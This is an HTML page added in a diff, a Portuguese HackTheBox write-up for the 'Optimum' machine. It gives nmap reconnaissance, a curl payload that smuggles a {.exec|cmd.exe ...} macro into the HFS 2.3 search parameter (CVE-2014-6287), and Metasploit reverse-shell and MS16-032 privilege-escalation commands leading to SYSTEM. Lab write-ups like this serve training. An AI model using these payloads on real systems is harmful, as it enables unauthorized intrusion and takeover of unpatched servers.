@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&display=swap" rel="stylesheet">
+   <link rel="stylesheet" href="../../../../../assets/css/articles.css">
+   <link rel="icon" type="image/png" href="/img/home/favicon.png" />
+   <title>optimum.</title>
+</head>
+
+<body>
+    <header class="header">
+        <nav class="breadcrumb">
+            <a href="/index.html">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M19 12H5M12 19l-7-7 7-7" />
+                </svg>
+                Voltar
+            </a>
+        </nav>
+        <div class="header-controls">
+            <div class="language-toggle">
+                <a href="../../../../pt-br/writeups/hackthebox/machines/optimum.html" class="active" title="Português (Brasil)">
+                    <svg viewBox="0 0 72 48" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="72" height="48" fill="#009c3b" />
+                        <polygon points="36,4 68,24 36,44 4,24" fill="#ffdf00" />
+                        <circle cx="36" cy="24" r="12" fill="#002776" />
+                        <path d="M24.5,21 Q36,28 47.5,21" stroke="#fff" stroke-width="2.5" fill="none" />
+                        <circle cx="30" cy="28" r="0.6" fill="#fff" />
+                        <circle cx="33" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="36" cy="31" r="0.6" fill="#fff" />
+                        <circle cx="39" cy="30" r="0.5" fill="#fff" />
+                        <circle cx="42" cy="28" r="0.6" fill="#fff" />
+                    </svg>
+                </a>
+                <a href="../../../../en-us/writeups/hackthebox/machines/optimum.html" title="English (US)">
+                    <svg viewBox="0 0 36 24" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="36" height="24" fill="#fff" />
+                        <rect width="36" height="1.85" y="0" fill="#b22234" />
+                        <rect width="36" height="1.85" y="3.7" fill="#b22234" />
+                        <rect width="36" height="1.85" y="7.4" fill="#b22234" />
+                        <rect width="36" height="1.85" y="11.1" fill="#b22234" />
+                        <rect width="36" height="1.85" y="14.8" fill="#b22234" />
+                        <rect width="36" height="1.85" y="18.5" fill="#b22234" />
+                        <rect width="36" height="1.85" y="22.2" fill="#b22234" />
+                        <rect width="14.4" height="12.95" fill="#3c3b6e" />
+                    </svg>
+                </a>
+            </div>
+        </div>
+    </header>
+   <main class="content">
+      <header class="article-header">
+         <h1>Optimum</h1>
+         <p class="meta">
+            HackTheBox &middot; Easy by <a href="https://www.linkedin.com/in/brennocm/">Brenno M.</a>
+         </p>
+      </header>
+      <section class="article-body writeup-body">
+         <p>Optimum roda o <b>HttpFileServer 2.3</b>, vulnerável a injeção de macros pelo parâmetro de busca (<b>CVE-2014-6287</b>), que dá shell como <i>kostas</i>. A escalação usa o <b>MS16-032</b> (CVE-2016-0099), uma falha no Secondary Logon do Windows Server 2012 R2.</p>
+
+         <figure class="attack-flow">
+            <figcaption>Fluxo do ataque</figcaption>
+            <svg viewBox="0 0 660 130" role="img" aria-label="Fluxo do ataque" xmlns="http://www.w3.org/2000/svg"><line x1="24" y1="32.0" x2="24" y2="52.0" stroke="#5c7a12" stroke-width="2"/><line x1="24" y1="78.0" x2="24" y2="98.0" stroke="#5c7a12" stroke-width="2"/><circle cx="24" cy="19.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="19.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">1</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="19.0">Reconhecimento</tspan></text><circle cx="24" cy="65.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="65.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">2</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="65.0">Exploração - CVE-2014-6287</tspan></text><circle cx="24" cy="111.0" r="13" fill="#16200a" stroke="#9fef00" stroke-width="2"/><text x="24" y="111.0" fill="#9fef00" font-size="12" font-weight="700" text-anchor="middle" dominant-baseline="central">3</text><text fill="#e4e4e4" font-size="15" font-weight="600" dominant-baseline="central"><tspan x="54" y="111.0">Escalação - MS16-032</tspan></text></svg>
+         </figure>
+
+         <h2>Reconhecimento</h2>
+
+         <p>A única porta aberta é a 80, com o <b>Rejetto HFS 2.3</b>.</p>
+
+         <pre class="code-block"><code>nmap -Pn -n -sT --min-rate 1500 -p- &lt;IP&gt;
+nmap -Pn -n -sT -sV -sC -p80 &lt;IP&gt;
+# 80 HttpFileServer httpd 2.3</code></pre>
+
+         <h2>Exploração - CVE-2014-6287</h2>
+
+         <p>O HFS para de filtrar o parâmetro <i>search</i> depois de um byte nulo, e o que vem depois é interpretado pela linguagem de macros dele, incluindo <code>{.exec|...}</code>. Dá para testar com um ping de volta antes de usar o módulo do Metasploit.</p>
+
+         <pre class="code-block"><code>sudo tcpdump -i tun0 icmp
+curl &quot;http://&lt;IP&gt;/?search=%00{.exec|cmd.exe+/c+ping+-n+1+&lt;MEU_IP&gt;.}&quot;
+
+msfconsole -q
+use exploit/windows/http/rejetto_hfs_exec
+set RHOSTS &lt;IP&gt;
+set LHOST &lt;MEU_IP&gt;
+run
+getuid   # OPTIMUM\kostas
+cat C:/Users/kostas/Desktop/user.txt</code></pre>
+
+         <h2>Escalação - MS16-032</h2>
+
+         <p>O <code>sysinfo</code> mostra um <b>Windows Server 2012 R2 x64</b>, mas o Meterpreter é x86. O exploit do MS16-032 precisa de um processo 64 bits, então migramos para um (como o <i>explorer.exe</i>) antes de rodá-lo.</p>
+
+         <pre class="code-block"><code>sysinfo
+ps
+migrate &lt;PID_x64&gt;
+background
+use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+set SESSION 1
+set LHOST &lt;MEU_IP&gt;
+set LPORT 4445
+run
+getuid   # NT AUTHORITY\SYSTEM
+cat C:/Users/Administrator/Desktop/root.txt</code></pre>
+      </section>
+   </main>
+   <br>
+   <footer>
+      <p>&copy; 20∞</p>
+   </footer>
+    <script src="../../../../../assets/js/article-toc.js" defer></script>
+</body>
+
+</html>
